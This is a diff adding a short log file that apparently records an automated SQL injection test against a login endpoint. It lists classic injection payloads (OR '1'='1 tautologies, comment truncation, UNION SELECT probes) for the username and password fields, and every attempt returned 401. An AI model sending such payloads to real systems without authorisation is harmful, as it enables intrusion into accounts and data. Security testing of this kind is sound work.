@@ -1,0 +1,22 @@
+# command: python3 tool_outputs/test_login_sqli.py
+# tool: python3
+# exit_code: 0
+# ts: 2026-09-29T14:31:59.520957+00:00
+# ---
+
+Payload: ' OR '1'='1... Status: 401, Time: 0.53s, Len: 41
+Payload: ' OR '1'='1' --... Status: 401, Time: 0.47s, Len: 41
+Payload: ' OR '1'='1' /*... Status: 401, Time: 0.56s, Len: 41
+Payload: admin' --... Status: 401, Time: 0.50s, Len: 41
+Payload: admin' /*... Status: 401, Time: 0.59s, Len: 41
+Payload: ' UNION SELECT NULL,NULL,NULL-... Status: 401, Time: 0.52s, Len: 41
+Payload: 1' AND (SELECT 1 FROM (SELECT ... Status: 401, Time: 0.49s, Len: 41
+
+--- Testing password parameter ---
+Payload: ' OR '1'='1... Status: 401, Time: 0.81s, Len: 41
+Payload: ' OR '1'='1' --... Status: 401, Time: 0.87s, Len: 41
+Payload: ' OR '1'='1' /*... Status: 401, Time: 0.80s, Len: 41
+Payload: admin' --... Status: 401, Time: 1.73s, Len: 41
+Payload: admin' /*... Status: 401, Time: 1.40s, Len: 41
+Payload: ' UNION SELECT NULL,NULL,NULL-... Status: 401, Time: 0.81s, Len: 41
+Payload: 1' AND (SELECT 1 FROM (SELECT ... Status: 401, Time: 0.98s, Len: 41
